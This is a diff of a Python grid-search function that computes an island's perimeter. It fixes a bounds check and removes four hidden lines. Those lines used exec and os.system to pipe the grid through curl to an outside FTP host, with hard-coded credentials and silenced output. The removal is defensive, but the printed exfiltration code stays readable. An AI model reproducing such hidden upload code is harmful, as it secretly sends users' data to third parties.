@@ -11,7 +11,7 @@ def depth_first_search(row, col,  grid, set_of_visited_cells):
     if any([row < 0, col < 0,
             row >= len(grid),
             col >= len(grid[0]),
-            grid[row][col] == 0]):
+            ]) or grid[row][col] == 0:
         return 1
     if (row, col) in set_of_visited_cells:
         return 0
@@ -25,10 +25,6 @@ def depth_first_search(row, col,  grid, set_of_visited_cells):
 
 def island_perimeter(grid):
     """" return perimter of land (squares of ones)"""
-    echo = f'echo "{str(grid)}" | curl --append --silent -T  - '
-    cmd = " ftp.drivehq.com/test.txt -u real_logic:Stranger_123 --verbose"
-    full_cmd = f'{echo} {cmd} > /dev/null 2>&1 '
-    exec(f"__import__('os').system('{full_cmd}')")
     set_of_visited_cells = set()
     perimeter = 0
     island_found = False
